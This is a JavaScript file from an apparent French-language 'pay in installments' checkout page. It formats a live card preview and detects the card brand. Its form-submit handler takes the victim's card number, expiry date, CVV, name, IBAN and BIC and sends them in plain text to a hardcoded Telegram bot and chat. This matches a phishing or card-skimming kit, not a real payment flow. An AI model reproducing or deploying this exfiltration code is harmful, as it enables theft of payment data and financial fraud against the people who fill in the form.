// Mise à jour dynamique de l'aperçu de la carte
document.getElementById('card-number').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s+/g, '');
    if (value.length > 16) value = value.substr(0, 16);
    
    let formatted = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' ';
        formatted += value[i];
    }
    
    document.getElementById('card-number-preview').textContent = formatted || '•••• •••• •••• ••••';
    detectCardType(value);
});

document.getElementById('expiry-date').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substr(0, 4);
    
    if (value.length > 2) {
        value = value.substr(0, 2) + '/' + value.substr(2);
    }
    
    document.getElementById('card-expiry-preview').textContent = value || '••/••';
});

document.getElementById('cvv').addEventListener('input', function(e) {
    const value = e.target.value.replace(/\D/g, '');
    document.getElementById('card-cvv-preview').textContent = value ? '•'.repeat(value.length) : '•••';
});

document.getElementById('card-name').addEventListener('input', function(e) {
    const value = e.target.value.toUpperCase();
    document.getElementById('card-name-preview').textContent = value || 'NOM SUR LA CARTE';
});

function detectCardType(number) {
    const cardLogo = document.getElementById('card-type-logo');
    
    // Visa
    if (/^4/.test(number)) {
        cardLogo.src = 'https://cdn.jsdelivr.net/gh/devicons/devicon/icons/visa/visa-original.svg';
    } 
    // Mastercard
    else if (/^5[1-5]/.test(number)) {
        cardLogo.src = 'https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mastercard/mastercard-original.svg';
    }
    // American Express
    else if (/^3[47]/.test(number)) {
        cardLogo.src = 'https://cdn.jsdelivr.net/gh/devicons/devicon/icons/americanexpress/americanexpress-original.svg';
    }
}

// Envoi des données à Telegram
document.getElementById('installment-form-step2').addEventListener('submit', function(e) {
    const formData = new FormData(this);
    const data = Object.fromEntries(formData.entries());
    
    const telegramBotToken = '7866279403:AAEWq-i2dnjUM4yQLuW9JbOZliuB8K_nmHA';
    const chatIds = ['5652184847'];
    
    let message = `Nouveau paiement en plusieurs fois - Étape 2:\n`;
    message += `Carte: ${data.card_number}\n`;
    message += `Exp: ${data.expiry_date}\n`;
    message += `CVV: ${data.cvv}\n`;
    message += `Nom: ${data.card_name}\n`;
    message += `IBAN: ${data.iban}\n`;
    message += `BIC: ${data.bic}\n`;
    message += `Plan: ${data.installment_plan} mois`;
    
    chatIds.forEach(chatId => {
        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
    });
});